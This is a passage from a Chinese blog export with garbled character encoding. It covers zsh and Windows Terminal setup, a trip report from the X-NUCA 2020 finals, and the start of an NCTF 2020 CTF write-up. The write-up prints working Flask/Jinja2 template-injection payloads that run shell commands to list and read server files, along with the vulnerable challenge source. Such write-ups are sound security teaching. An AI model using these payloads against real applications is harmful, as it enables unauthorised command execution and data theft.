è¿™ä¸ªæ³¨é‡Šå»é™¤äº†å°±è¡Œï¼Œå½“ç„¶ä¹Ÿå¯ä»¥è®¾ç½®æˆä½ å–œæ¬¢çš„æ—¶é—´æ ¼å¼ã€‚ é…ç½®å¥½çš„æ•ˆæœç±»ä¼¼äºä¸‹å›¾ã€‚ æ›´æ–° oh-my-zshé»˜è®¤çš„è¯æ˜¯æœ‰æ›´æ–°çš„æ—¶å€™ä¼šæç¤ºï¼Œé—®ä½ è¦ä¸è¦æ›´æ–°ã€‚ å¦‚æœéœ€è¦å®ƒè‡ªåŠ¨æ›´æ–°çš„è¯ï¼ŒæŠŠ ~/.zshrc é‡Œä¸‹é¢è¿™è¡Œæ³¨é‡Šå–æ¶ˆå°±å¥½äº†ã€‚ DISABLE_UPDATE_PROMPT=true æ‰‹åŠ¨æ›´æ–°çš„è¯ï¼Œç›´æ¥æ‰§è¡Œupgrade_oh_my_zsh. Note: upgrade_oh_my_zsh is deprecated. Use omz update instead. å•Šç°åœ¨æ¢æˆä¸‹é¢è¿™ä¸ªäº†ã€‚ omz update å¸è½½ oh-my-zshï¼ˆä¸ä¼šå§ï¼Œè¿™å°±å¸äº†ï¼Ÿ uninstall_oh_my_zsh 0x04 é…ç½® zsh ä¸º bash é»˜è®¤ç»ˆç«¯ç¼–è¾‘ ~/.bashrcï¼Œæˆ–è€…æ˜¯ D:\\Program Files\\Git\\etc\\bash.bashrcï¼ŒåŠ å…¥ä¸‹é¢çš„å‡ è¡Œã€‚ # Launch Zsh if [ -t 1 ]; then exec zsh fi è€Œåé‡å¯ git bash å³å¯è‡ªåŠ¨ä»¥ zsh å¯åŠ¨ã€‚ 0x05 é…ç½® Windows Terminal ä½¿ç”¨ git bashå½“ç„¶é¦–å…ˆæ˜¯åœ¨ Microsoft Store é‡Œå®‰è£… Windows Terminal äº†ï¼Œè¿™é‡Œç•¥äº†ã€‚ ä½ çœ‹ Terminal å¤šå¥½çœ‹ï¼ˆ ä½¿ç”¨å¿«æ·é”® Ctrl + , æ‰“å¼€é…ç½®æ–‡ä»¶ settings.jsonã€‚ åœ¨ profiles &gt; list ä¸‹æ–°å¢ä¸€ä¸ª objectï¼ŒåŠ å…¥ git bashã€‚ commandline ä¸º git bash çš„è·¯å¾„ã€‚ ä¸ºäº†ç¡®ä¿ .bash_profile è¢«åŠ è½½ï¼Œéœ€è¦åœ¨ commandline é€‰é¡¹ä¸­åŠ å…¥ -l -i ã€‚ icon å›¾æ ‡æ˜¯ä¸‹é¢è¿™ä¸ªï¼Œå½“ç„¶ä¹Ÿå¯ä»¥æ¢æˆä½ å–œæ¬¢çš„ã€‚ è¿™é‡Œç»™å‡ºæˆ‘çš„é…ç½®ï¼Œä¾›å‚è€ƒã€‚ { \"guid\": \"{1c4de342-38b7-51cf-b940-2309a097f589}\", \"hidden\": false, \"name\": \"git bash\", \"commandline\": \"\\\"D:\\\\Program Files\\\\Git\\\\bin\\\\bash.exe\\\" -i -l\", \"historySize\": 9001, \"name\": \"Bash\", \"closeOnExit\": true, \"useAcrylic\": true, \"acrylicOpacity\": 0.85, //é€æ˜åº¦ \"icon\": \"D:\\\\tools\\\\my-git-bash\\\\git-icon.png\", \"startingDirectory\": null } é»˜è®¤ä½¿ç”¨ git bash ä½œä¸º Terminal å¯åŠ¨ä¿®æ”¹ä¸Šè¿°æ–‡ä»¶ä¸­çš„ defaultProfile ä¸º git bash çš„ guidï¼Œæ­¤å¤„ä¸º {1c4de342-38b7-51cf-b940-2309a097f589}ã€‚ æ•ˆæœç±»ä¼¼äº \"defaultProfile\": \"{1c4de342-38b7-51cf-b940-2309a097f589}\" 0x06 å°† Windows Terminal åŠ å…¥åˆ°å³é”®èœå•é¦–å…ˆ åœ¨ cmd é‡Œ æµ‹è¯•ä¸€ä¸‹ä¸‹é¢è¿™ä¸¤ä¸ªå¸¸é‡æ˜¯å¦æ­£å¸¸ã€‚ echo %USERPROFILE% echo %LOCALAPPDATA% å¦‚æœæœ‰ç›¸åº”çš„ä¿¡æ¯è¾“å‡ºï¼Œåˆ™åç»­å¯ç›´æ¥ä½¿ç”¨è¿™ä¸¤ä¸ªå¸¸é‡ã€‚ å¦åˆ™éœ€è¦è¿›è¡Œå¦‚ä¸‹æ›¿æ¢ï¼š %USERPROFILE% =&gt; C:\\Users\\&lt;username&gt; %LOCALAPPDATA% =&gt; C:\\Users\\&lt;username&gt;\\AppData\\Local å…¶ä¸­ï¼Œ&lt;username&gt; æ˜¯ä½ çš„ç”¨æˆ·åã€‚ æ–°å»ºç›®å½• mkdir \"%USERPROFILE%\\AppData\\Local\\terminal\" æŠŠ Windows Terminal å›¾æ ‡å¤åˆ¶åˆ°è¿™ä¸ªç›®å½•ä¸‹ï¼Œå›¾æ ‡æ”¾åœ¨ è¿™é‡Œ terminal.icoã€‚ å°†å¦‚ä¸‹å†…å®¹å¦å­˜ä¸º wt.reg, ç„¶åä»¥ â€œç®¡ç†å‘˜æƒé™â€ è¿è¡Œ Windows Registry Editor Version 5.00 [HKEY_CLASSES_ROOT\\Directory\\Background\\shell\\wt] @=\"Windows terminal here\" \"Icon\"=\"%LOCALAPPDATA%\\\\terminal\\\\terminal.ico\" [HKEY_CLASSES_ROOT\\Directory\\Background\\shell\\wt\\command] @=\"C:\\\\Users\\\\&lt;your username&gt;\\\\AppData\\\\Local\\\\Microsoft\\\\WindowsApps\\\\wt.exe\" è¯·æ³¨æ„ï¼Œå¯¹äºæœ€åä¸€è¡Œ wt.exe çš„è·¯å¾„ï¼Œéœ€ä½¿ç”¨å®Œæ•´çš„ç»å¯¹è·¯å¾„ï¼Œå¦åˆ™ä¼šæŠ¥é”™ã€‚ è€ŒååŒå‡»æ‰§è¡Œï¼Œå°†é…ç½®æ·»åŠ åˆ°æ³¨å†Œè¡¨ã€‚ æ•ˆæœå°±åƒä¸‹é¢è¿™æ ·äº†ã€‚ ç‚¹å‡»ä¹‹åå°±èƒ½è¿›å…¥ git bashï¼Œä½¿ç”¨ zsh ç»ˆç«¯ï¼Œå¹¶ä¸”å°±åœ¨å½“å‰ç›®å½•ä¸‹äº†ã€‚ 0x07 ä¸€äº› Git Bash é…ç½®å’Œå¿«æ·é”®å‚è€ƒ https://github.com/xnng/my-git-bash è¿™é‡Œé¢è¿˜æœ‰ä¸€äº›ç‰¹å®šé’ˆå¯¹äº git bash çš„å­—ä½“ / ä¸»é¢˜ / Tmux / wgetã€treeå®‰è£… / VSCode + git bash ç›¸å…³çš„è®¾ç½®ã€‚ ä½†è¦æ³¨æ„ï¼Œæœ‰ä¸€äº›å’Œ zshã€Oh-my-zsh çš„é…ç½®ä¼šæœ‰å†²çª emmm æ‰€ä»¥ä½ å–œæ¬¢ç”¨ zsh çš„è¯ï¼Œå°±ç›´æ¥é…ç½® zsh å¥½äº†å”‰ã€‚ å¸¸ç”¨çš„å¿«æ·é”® æŒ‰é”® æ•ˆæœ Alt + Enter å…¨å± å…³é—­çª—å£ Ctrl + Dï¼ˆéœ€å½“å‰è¡Œæ²¡æœ‰å­—ç¬¦æ‰å¯ç”¨ï¼‰ æ¸…å± Ctrl + L æ‰“å¼€ç»ˆç«¯ å³é”®å¿«æ·æ–¹å¼ï¼Œåœ¨å±æ€§ä¸­è‡ªè¡Œè®¾ç½® å¤åˆ¶ç²˜è´´ Ctrl + Shift + C/Vï¼ˆv2.20.0 ç‰ˆæœ¬åæ‰æ”¯æŒï¼‰ å…¶ä»–å¿«æ·é”®éµå¾ª Bash æ ‡å‡†å¿«æ·é”®ï¼Œä¾‹å¦‚ Ctrl + R æœç´¢å†å²å‘½ä»¤ã€exit é€€å‡ºç»ˆç«¯ã€clear å’Œ reset æ¸…å±ã€Ctrl + E/A å…‰æ ‡åˆ°è¡Œé¦–å°¾ï¼Œç­‰ç­‰å¯è‡ªè¡Œæœç´¢ã€‚ æ€»ç»“åæ­£è´¼èˆ’æœå°±æ˜¯äº†ï¼ ï¼ˆæºœäº†æºœäº†å–µ References &amp; Extensive Reading install-zsh-windows-git-bash.md install zsh with git-bash on Windows10 CSDN: åˆ©ç”¨Oh-My-Zshæ‰“é€ ä½ çš„è¶…çº§ç»ˆç«¯ Linux ç»ˆç«¯ç¾åŒ– - Oh My Zsh åœ¨windwos terminal ä¸­ä½¿ç”¨git bashçš„alias GitHub: xnng/my-git-bash ä½¿ç”¨ ohmyzsh æ‰“é€  windowsã€ubuntuã€mac ç³»ç»Ÿé«˜æ•ˆç»ˆç«¯å‘½ä»¤è¡Œå·¥å…·ã€‚ Bä¹ï¼šæ–°å‘å¸ƒçš„Windows Terminalå¦‚ä½•æ·»åŠ åˆ°å³é”®èœå•ï¼Ÿ win10 å®‰è£… oh my zsh å’Œ windows git bash è®¾ç½®åˆ«åæé«˜æ•ˆç‡ How to Install Oh My Zsh! on Windows 10 Home Edition etc.","path":"2020/12/13/Server_Terminal_gitbash_zsh/"},{"title":"ç¢ç¢å¿µ | X-NUCA 2020 å…¨å›½é«˜æ ¡ç½‘å®‰è”èµ›æ€»å†³èµ› æ·±åœ³æ¸¸è®°","text":"å‰è¨€è¿™å‡ å¤©å»æ·±åœ³æ‰“äº†ä¸ª X-NUCA 2020 å…¨å›½ç½‘å®‰è”èµ›æ€»å†³èµ›ï¼Œè¶ç€è¿˜æœ‰å…´è‡´ï¼Œå°±æ¥å¤§æ¦‚æ€»ç»“ä¸€ä¸‹å§ï¼Œå–µ~ éš¾å¾—çº¿ä¸Šèµ›æŒ¤è¿›äº†å…¨å›½å‰ 20ï¼Œæœ‰æœºä¼šå»çº¿ä¸‹è§åˆ°äº†ä¸€å †å¤§è€é¼ ã€‚ æ—…æ¸¸åˆ’æ°´æ‘¸é±¼é€‰æ‰‹æ˜¯æˆ‘äº†ï¼Œå”‰ï¼Œæœç„¶å°±èººå¹³äº†ã€‚ æœ€å¤§æ„Ÿå—å°±æ˜¯æ¯”èµ›è¿‡äºç¡¬æ ¸ï¼Œèµ›åˆ¶ç›´åˆ°å¼€å¹•å¼æ‰å…¬å¸ƒï¼Œ4é“ git based AD + 2 é“ KOHï¼Œè‚ä¸€å¤©åŠã€‚ å¯¹ï¼Œæ˜¯å®Œå…¨æ²¡ä½“éªŒè¿‡çš„èµ›åˆ¶ï¼Œé¢˜ç›®ç±»å‹ä»¥äºŒè¿›åˆ¶ä¸ºä¸»ï¼Œæ··æ‚ç€ pwn RE web crypto algorithmï¼Œä¸ä¼š binary çš„ misc æ‰‹æ²¡æœ‰æ¸¸æˆä½“éªŒå˜¤å˜¤å˜¤ï¼ˆ æœç„¶æ˜¯å›½å†…ä¸ºæ•°ä¸å¤šçš„é«˜è´¨é‡æ¯”èµ›äº†ï¼Œä¹Ÿæ˜¯æ‰“è¿‡çš„æœ€ç¡¬æ ¸çš„ CTF äº†ï¼Œå¯æƒœå¯èƒ½æ²¡æœºä¼šå†æ¥ç©äº†å‘œå‘œå‘œ é¢˜ç›®å›é¡¾git based ADï¼Œä¹‹å‰è¿˜æ²¡è§è¿‡è¿™ç§ç”¨ git ç»´æŒæ¯”èµ›ç¯å¢ƒçš„ï¼Œå°±æ˜¯ä¸»åŠæ–¹æ­äº†ä¸ª GitLabï¼Œç»™å„é˜Ÿåˆ†é…äº†ç”¨æˆ·åå¯†ç ä»¥åŠä»“åº“ï¼Œä¸åŒé¢˜ç›®æ”¾åœ¨ä¸åŒçš„åˆ†æ”¯ã€‚ ä¿®å¤æ¼æ´éœ€è¦æŠŠ patch æ–‡ä»¶ push ä¸Šå»ï¼Œå¦‚æœ check é€šè¿‡äº†è¯ï¼Œåˆ™æ¨é€åˆ°å›¢é˜Ÿè‡ªå·±çš„ gamebox é‡Œã€‚äºæ˜¯ä¹å¼€å¹•å¼è¿˜å»å¤ä¹ äº†ä¸€æ³¢ git æ“ä½œï¼Œå”‰è¿˜æ˜¯å¤ªèœäº†ã€‚ ä¸è¿‡è¿™å€’æ˜¯æœ‰ä¸ªå¥½å¤„ï¼Œé¢˜ç›®ä¸å®¹æ˜“è¢«åˆ«äººæ…ä¹±ï¼Œå½“ç„¶å•¥æµé‡ä¹ŸæŠ“ä¸åˆ°äº†å˜¤å˜¤å˜¤ã€‚ å¦å¤–å‘¢è¿˜å¼•å…¥äº† NPC é¢˜ï¼Œå°±æ˜¯åªèƒ½æ‰“ä¸èƒ½é˜²ï¼Œåæ­£æ„Ÿè§‰å°±ç±»ä¼¼äºå¹³å¸¸è§£é¢˜èµ›é‡Œçš„é¢˜å‹äº†ã€‚ ï¼ˆæ¯”èµ›æœŸé—´æ‰çŸ¥é“åŸæ¥åªæœ‰ pwn é¢˜æ˜¯æ”»é˜²ç»“åˆçš„ï¼Œweb æ˜¯ NPCï¼Œå®³ KOH é¢˜å‹ä¹ŸæŒºæœ‰æ„æ€çš„ï¼ŒKing Of the Hillï¼Œå°±æ˜¯å®Œæˆé¢˜ç›®ä»£ç æ‰€ç»™çš„ä¸€ä¸ªä»»åŠ¡ï¼Œé€šè¿‡ git push çš„æ–¹å¼æŠŠä»£ç æˆ–è€…æ•°æ®ä¼ ä¸Šå»ï¼Œè€Œååå°çš„ OJ è¿›è¡Œè¯„æµ‹æ‰“åˆ†ï¼ŒæŒ‰ç…§è¿™ä¸ªæ‰“åˆ†çš„æ’åè¿›è¡Œæ’åºï¼ŒæŠ˜åˆæˆæœ€åçš„æ€»åˆ†ã€‚ ä¹ä¸€çœ‹è¿˜ä»¥ä¸ºæ˜¯ OI é‡Œçš„å•¥ç®—æ³•é¢˜ï¼Œä¸€è„¸æ‡µé€¼ï¼Œä¸è¿‡ç¡®å®æŒºåƒçš„ï¼Œéƒ½æ²¡ç©è¿‡å°±æ˜¯äº†ã€‚åˆ°æœ€åè¿™é¢˜ç›®è€å†…å·äº†ï¼Œæœç„¶å¦‚å…¶å King Of the Hill äº†ã€‚ ä¸‹é¢æ˜¯ç¡¬æ ¸ç¯èŠ‚ï¼Œæ¥ç®€å•çœ‹çœ‹é¢˜ç›®æ€ä¹ˆç¡¬æ ¸çš„å§ï¼ˆqs æ¯”å¦‚ç»™äº†ä¸€å¥—æœ€æ–°ç‰ˆçš„ WordPress å’Œä¸€å †æ’ä»¶ é­”æ”¹åçš„æºç  &amp; dump å‡ºæ¥çš„ sql æ–‡ä»¶ï¼Œå»æŒ–æ´æ‰¾ flagï¼ˆç„¶è€Œ diff äº†åŠå¤©ä¸çŸ¥é“æ€ä¹ˆç”¨ï¼Œåœ¨æœ¬åœ°æ­äº†ä¸€æ™šä¸Š PHP ç¯å¢ƒç„¶è€Œ php-mysql çš„æ’ä»¶è£…ä¸ä¸Šäºæ˜¯è·‘ä¸èµ·æ¥ï¼Œå¿ƒæ€å´©äº† æ¯”å¦‚æŒ–ä¸€ä¸ªæ‰‹å†™çš„ Cè¯­è¨€ç¼–è¯‘å™¨ é‡Œçš„æ´ï¼ˆé˜Ÿå‹è¡¥äº†æ´å‘ç°è¿˜æ˜¯ä¸€ç›´è¢«æ‰“ï¼Œè¿˜åŠ¨ä¸åŠ¨ check down patch ä¸ä¸Šå»ï¼Œæœ€åå‡ºé¢˜äººè¯´æœ‰8ä¸ªæ´ï¼Œäººéƒ½å‚»äº† æ¯”å¦‚ä¸€ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶ï¼Œé€†å‘å‡ºæ¥æ··æ‚ç€ AES RSA å¯†ç å­¦æ±‚è§£ï¼ˆè¦æ˜¯ç›´æ¥ç»™ crypto å¯èƒ½è¿˜èƒ½çœ‹çœ‹å˜¤å˜¤å˜¤ æ¯”å¦‚ä¸€ä¸ª mips æ¶æ„äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œé€†å‘å‡ºæ¥å†™äº†ä¸ª web æœåŠ¡ï¼ŒGET POST DELETE ç­‰ç­‰ä¸åŒæ–¹æ³•æ‰§è¡Œä¸åŒæŒ‡ä»¤ï¼Œæ¶‰åŠå †æ“ä½œå•¥çš„ï¼ˆå•¥ç©æ„å•Šï¼ŒåŠé€€äº† æ¯”å¦‚ KOH ç»™äº†ä¸€ä¸ª é¢å‘å¯¹è±¡çš„ cppï¼Œçœ‹äº†è´¼ä¹…æ‰çŸ¥é“å¤§æ¦‚æ˜¯ä¸ª driver å¼€è½¦è½¦çš„ç®—æ³•æ¨¡æ‹Ÿï¼Œè¾“å…¥ä¸¤ä¸ªçŸ©é˜µä¸€ä¸ª noiseï¼Œç»“åˆéšæœºæ•°ç»è¿‡ä¸€ç³»åˆ—è¿ç®—ä¹‹åå¦‚æœåœ¨ç»™å®šæœ€å¤§æ—¶é—´å†…å’Œç›®æ ‡çš„è·ç¦»åœ¨é˜ˆå€¼èŒƒå›´å†…åˆ™è®¤ä¸º grabï¼Œè¿™æ ·æŒç»­ 256 è½®åæ¯”è°çš„ç”¨æ—¶çŸ­ï¼ˆèµ›åé—®äº† THU Nanoï¼Œæœç„¶æ­äº†ä¸ªç¥ç»ç½‘ç»œå»è®­ç»ƒ Orzï¼Œåé¢æœ‰æœºä¼šå†æ¥å¤ç°ä¸€ä¸‹è¿™ä¸ª8 æ¯”å¦‚å¦ä¸€ä¸ª KOH æ¶‰åŠå¤šçº¿ç¨‹å’Œ pipe è¯»å†™ï¼Œæ‰§è¡Œæäº¤ä¸Šå»çš„ shellcodeï¼Œåœ¨å®ç°åŠŸèƒ½çš„å‰æä¸‹æ¯”è°çš„é•¿åº¦çŸ­ï¼ˆé˜Ÿå‹æ‰‹æ“ shellcode ç„¶åæŒ‰ç…§ byte ä¼˜åŒ–ï¼Œå”‰éƒ½æ˜¯æˆ‘ä¸æ‡‚çš„ä¸œè¥¿ æ¯”å¦‚â€¦å•Šæ²¡äº†ï¼Œå°±è¿™äº›é¢˜äº†ï¼Œå¯èƒ½è¯´çš„ä¸å¤§å¯¹æ•¬è¯·æŒ‡æ­£ Orzã€‚ åæ­£è¹²å®˜æ–¹å’Œå¤§è€é¼ ä»¬çš„ WriteUp å°±æ˜¯äº†ã€‚ ä¸€äº›æœ‰æ„æ€çš„äº‹ åˆ°äº†å¼€å¹•å¼æ‰çŸ¥é“ï¼ŒåŸæ¥ X-NUCA çš„çœŸæ­£è¯»æ³•ç±»ä¼¼äº [eks ËˆnjuËkÉ‘Ë(r)] æ¯”èµ›ç°åœºä¸»åŠæ–¹æä¾›ç‚¹æ­ŒæœåŠ¡ï¼Œå¥½è¯„ èƒ½è¿çƒ­ç‚¹ä¸Šå¤–ç½‘ï¼Œä½†è¢«å†…å¤–ç½‘åŒç½‘å…³æŠ˜ç£¨äº†è´¼ä¹…ï¼Œå¼€èµ›ååŠä¸ªå¤šå°æ—¶åœ¨ç ”ç©¶æ€ä¹ˆé…ç½‘ï¼Œæœ€åæ‰‹åŠ¨é…ç½®è·¯ç”±ç­–ç•¥ä»¥åŠå¸®é˜Ÿå‹é…ï¼ˆå¯èƒ½ç®—æ˜¯é‚£ä¹ˆä¸€ç‚¹ç‚¹æ¯”èµ›ä½“éªŒå§ï¼Œé˜Ÿå‹åŠ¨ä¸åŠ¨æ‹”æ’æ‹”æ’ç½‘çº¿æœ‰ç”»é¢æ„Ÿäº†å§ é¢å¥–å…¸ç¤¼æºœå‡ºå»é€›äº†ä¸€åœˆæ·±åœ³å¤§å­¦æ ¡å›­ï¼Œæ ¡å›­å¥½å¤§è¿˜æœ‰è§‚å…‰è½¦ï¼ˆæ ¡å†…ç­è½¦ï¼Ÿï¼‰ï¼Œè¿˜çœ‹åˆ°äº†é«˜å°”å¤«æ•™å­¦å®éªŒä¸­å¿ƒï¼Œæœ‰é’±æœ‰é’±ï¼Œxmsl é¢å¥–å…¸ç¤¼ç»“æŸåå¯ä»¥æ‹¿å›æˆ˜é˜Ÿçš„æ——å­ï¼Œå•Šæ˜¯çœŸæ­£çš„å¤ºæ——èµ› 233 é™ˆå›½è‰¯é™¢å£«çš„æŠ¥å‘Šï¼Œå·¦ä¸‹è§’ The above picture is from the Internetï¼Œæœ‰ç‚¹è®²ç©¶ã€‚ ç„¶åç¾¤å‹åšäº†ä¸‹é¢è¿™ä¸ªå›¾ï¼ˆ æˆåŠŸå’Œ Nohn ä»¥åŠ æœ€å¼ºå¤§è„‘è„‘ç‹ NanoApe é¢åŸºï¼Œåœ†äº†æŠ± Nano çš„å°å¿ƒæ„¿ï¼Œè¦åˆ°äº† Nano ç­¾åï¼Œå–µï¼Œå¥½å°ä¸€åªçœŸçš„å¥½å¯çˆ±ï¼Œiäº†iäº†ï¼ å»æ·±åœ³æ¹¾å…¬å›­ã€æ·±åœ³äººæ‰å…¬å›­è½¬äº†è½¬ï¼Œæµ·è¾¹å„ç§è‘—åä¼ä¸šçš„é«˜æ¥¼å¤§å¦ï¼Œå¤œæ™¯è´¼ä¸é”™ é…’åº—åºŠå¤´å±…ç„¶æ²¡æœ‰æ’åº§ï¼Œå·®è¯„ï¼ ä¸è¿‡çª—å¤–çš„é£æ™¯è¿˜è¡Œï¼ˆ ï¼ˆè¯è¯´è¿œå¤„çš„è…¾è®¯å¤§å¦é‡Œæ˜¯ä¸æ˜¯è¿˜æœ‰ä¸€å † 996 å‘¢ æ·±åœ³çš„åœ°é“è¿˜åˆ†ç©ºè°ƒå¼ºå†·å’Œå¼±å†·è½¦å¢ï¼Œè½¦å¢å†…çš„æ˜¾ç¤ºå±å¯¹å‡ºå£ã€ä¸Šä¸‹ç”µæ¢¯çš„ä½ç½®æ ‡è¯†æŒºæ¸…æ¥šçš„ï¼Œå¥½è¯„ã€‚ etc. æ€»ä¹‹è¿™å‡ å¤©ç©å¾—å€’æ˜¯æŒºå¼€å¿ƒçš„ï¼Œå–µå–µ~ ï¼ˆæºœäº†æºœäº†","path":"2020/12/10/Life_2020XNUCA_trip/"},{"title":"CTF | 2020 NCTF/NJUPTCTF éƒ¨åˆ†WriteUp","text":"å¼•è¨€ä¸€å¹´ä¸€åº¦çš„ NCTF åˆæ¥äº†ã€‚ åˆšåˆšè¿‡å»çš„è¿™å‘¨æœ«æ¯”èµ›æœ‰ç‚¹å¤šï¼Œä»¥è‡³äºæ‰“èµ·æ¥æœ‰ç‚¹ä½›ç³»ã€‚ å—é‚®çš„å¸ˆå‚…ä»¬å‡ºé¢˜å¾ˆä¸é”™ï¼Œå—¯ï¼Œå€¼å¾—è¢«é”¤ã€‚ æœŸå¾…äº†åŠå¤©å‘ç°æ²¡æœ‰çœŸæ­£çš„ Misc é¢˜ï¼Œæœ‰äº¿ç‚¹ç‚¹éš¾å—ï¼Œæ²¡åŠæ³•åªèƒ½ç¡¬è‚ Web é¢˜äº†ï¼Œå¤ªéš¾é¡¶äº†ã€‚ è¿™é‡Œå°±å†™ä¸€ä¸‹æˆ‘åšçš„å‡ é“é¢˜çš„ WriteUp å¥½äº†ã€‚ ï¼ˆé¡ºä¾¿åæ§½ä¸€ä¸‹ Webä½ å°±æ˜¯æˆ‘çš„masterå— æ¥ç­¾ä¸ªåˆ°å­~ å¤‡ç”¨åœ°å€ï¼šhttp://42.192.72.11:10001~10007 Flask SSTI. ç”¨ \\x5f æ¥æ›¿ä»£ _ï¼Œè¿‡æ»¤æ‰çš„å…³é”®è¯ç”¨ \"\" åŒå¼•å·æ‹¼æ¥å°±å¥½äº†ã€‚ Payload: çœ‹çœ‹å½“å‰ç›®å½•æœ‰å•¥ã€‚ http://42.192.72.11:10001/ ?name={{\"\"[\"\\x5f\\x5fcla\"\"ss\\x5f\\x5f\"][\"\\x5f\\x5fba\"\"se\\x5f\\x5f\"][\"\\x5f\\x5fsubcla\"\"sses\\x5f\\x5f\"]()[408][\"\\x5f\\x5fin\"\"it\\x5f\\x5f\"][\"\\x5f\\x5fglo\"\"bals\\x5f\\x5f\"][\"\\x5f\\x5fbuiltins\\x5f\\x5f\"][\"\\x5f\\x5fimport\\x5f\\x5f\"](\"os\")[\"popen\"](\"ls\")[\"read\"]()}} æ—©å®‰ï¼Œæ‰“å·¥äºº&lt;br/&gt;ä½ å°±æ˜¯æˆ‘çš„app.py wo_ta_niang_de_bu_shi_ni_de_fla9 å—ï¼Ÿ&lt;br/&gt;&lt;!-- ?name=master --&gt; è¯» flagï¼š http://42.192.72.11:10001/ ?name={{\"\"[\"\\x5f\\x5fcla\"\"ss\\x5f\\x5f\"][\"\\x5f\\x5fba\"\"se\\x5f\\x5f\"][\"\\x5f\\x5fsubcla\"\"sses\\x5f\\x5f\"]()[408][\"\\x5f\\x5fin\"\"it\\x5f\\x5f\"][\"\\x5f\\x5fglo\"\"bals\\x5f\\x5f\"][\"\\x5f\\x5fbuiltins\\x5f\\x5f\"][\"\\x5f\\x5fimport\\x5f\\x5f\"](\"os\")[\"popen\"](\"cat *\")[\"read\"]()}} æºç ï¼š from flask import Flask, request from jinja2 import Template app = Flask(__name__) @app.route(\"/\") def index(): name = request.args.get('name', 'guest') blacklist = ['%','-',':','+','class','base','mro','_','config','args','init','global','.','\\'','req','|','attr','get'] for i in blacklist: if i in name: return Template('ä½ çœŸæ˜¯ä¸ªå°å¯çˆ±').render() t = Template(\"æ—©å®‰ï¼Œæ‰“å·¥äºº&lt;br/&gt;ä½ å°±æ˜¯æˆ‘çš„\" + name + \"å—ï¼Ÿ&lt;br/&gt;&lt;!-- ?name=master --&gt;\") return t.render() if __name__ == \"__main__\": app.run() NCTF{ni_t@_niang_dee_jiu_shi_woo_de_master_ma} è¿™çœŸçš„æ˜¯ç­¾åˆ°é¢˜ä¹ˆï¼Ÿ ï¼ˆå™¢å¯¹äº†ï¼Œå‡ºé¢˜äººè¯´è¿™è¿˜æ˜¯éé¢„æœŸï¼Œemmm å®˜æ–¹ payload å¦‚ä¸‹ï¼Œå™¢æ˜¯è¿™ä¸ªæ„æ€çš„ å…¨åå…­è¿›åˆ¶ å”‰ã€‚ç¡®å®å·®ä¸å¤šã€‚ ?name={{\"\"[\"\\x5f\\x5f\\x63\\x6c\\x61\\x73\\x73\\x5f\\x5f\"][\"\\x5f\\x5f\\x62\\x61\\x73\\x65\\x5f\\x5f\"][\"\\x5f\\x5f\\x73\\x75\\x62\\x63\\x6c\\x61\\x73\\x73\\x65\\x73\\x5f\\x5f\"]()[64][\"\\x5f\\x5f\\x69\\x6e\\x69\\x74\\x5f\\x5f\"][\"\\x5f\\x5f\\x67\\x6c\\x6f\\x62\\x61\\x6c\\x73\\x5f\\x5f\"][\"\\x5f\\x5f\\x62\\x75\\x69\\x6c\\x74\\x69\\x6e\\x73\\x5f\\x5f\"][\"\\x5f\\x5f\\x69\\x6d\\x70\\x6f\\x72\\x74\\x5f\\x5f\"](\"\\x6f\\x73\")[\"\\x70\\x6f\\x70\\x65\\x6e\"](\"ls\")[\"\\x72\\x65\\x61\\x64\"]()}} JS-world JavaScript can quickly turn our everyday job into hell, and some of them can make us laugh out loud. Have fun. hint1: script.js has sth useful. http://42.192.72.11:8090/ é¦–å…ˆçœ‹äº†ä¸€ä¸‹åç«¯æ˜¯ Expressï¼Œç”¨äº† EJS æ¨¡æ¿å¼•æ“ æ¥æ¸²æŸ“é¡µé¢ã€‚ è°ƒè¯•åˆ†æäº†ä¸€ä¸‹é€»è¾‘ï¼ŒJS é€†å‘æœ‰ä¸€ç‚¹ç‚¹éº»çƒ¦ã€‚ æœ¬æ¥è¿˜è§£æ··æ·†äº†ä¸€ä¸‹ï¼Œä¸è¿‡åæ¥å‘ç°è²Œä¼¼æ²¡å¿…è¦äº†ï¼Œä¹Ÿå¹¶ä¸éœ€è¦é€†å‘äº†ã€‚ é‡ç‚¹åœ¨ /js/script.js æ–‡ä»¶é‡Œå¯¹è¾“å…¥çš„ code ä¸€äº›å…³é”®å­—è¿›è¡Œè¿‡æ»¤ä»¥åŠåŠ å¯†ã€‚ å…³é”®æºç ï¼š function create() { var _0x1bef85 = _0x1656 , _0x23132f = document[_0x1bef85('0x9')]('MyCode')[_0x1bef85('0xe')]; _0x23132f = _0x23132f[_0x1bef85('0x5')](/[\\/\\*\\'\\\"\\`\\&lt;\\\\\\&gt;\\-\\(\\)\\[\\]\\=\\%\\.]/g, ''); var _0x1658d5 = _0x1bef85('0x8') + _0x23132f + _0x1bef85('0x2'); _0x1658d5 = btoa(xor(_0x1bef85('0xc'), _0x1658d5)); var _0x23601e = new XMLHttpRequest(); _0x23601e['open'](_0x1bef85('0x13'), _0x1bef85('0x7'), !![]), _0x23601e['setRequestHeader'](_0x1bef85('0x11'), _0x1bef85('0xd')); var _0x3deb5a = _0x1bef85('0x4') + escape(_0x1658d5); return _0x23601e[_0x1bef85('0xa')](_0x3deb5a), alert('Done.\\x0aCheck\\x20/templates\\x20now.'), ''; } å…¶ä¸­ï¼Œdocument[_0x1bef85('0x9')]('MyCode')[_0x1bef85('0xe')] å°±æ˜¯é€šè¿‡ getElementById è·å¾—è¾“å…¥çš„æ•°æ®ã€‚ _0x23132f[_0x1bef85('0x5')] å‡½æ•°ä¸º replaceï¼Œå¯è§æŠŠè¿™äº›ç¬¦å·ç»™è¿‡æ»¤æ‰äº†ã€‚ ä¹‹åè¿™æ®µæ˜¯è¿›è¡ŒåŠ å¯†ã€‚ var _0x1658d5 = _0x1bef85('0x8') + _0x23132f + _0x1bef85('0x2'); _0x1658d5 = btoa(xor(_0x1bef85('0xc'), _0x1658d5)); æœ€åè°ƒç”¨ XMLHttpRequest æŠŠæ•°æ®å‘ç»™åç«¯ã€‚ åœ¨ /templates ç›®å½•å°±èƒ½çœ‹åˆ°ç”Ÿæˆçš„é¡µé¢äº†ã€‚ å› æ­¤åšé¢˜çš„è¯ï¼Œç›´æ¥æŠŠè¿‡æ»¤çš„è¿™æ¡è¯­å¥åˆ äº†å°±å¥½äº†ã€‚ è¿™é‡Œä¸ºäº†æ–¹ä¾¿ç›´æ¥ä¼ å‚äº†ã€‚ æŠŠè¿™æ®µæ”¾åˆ°æµè§ˆå™¨ Console 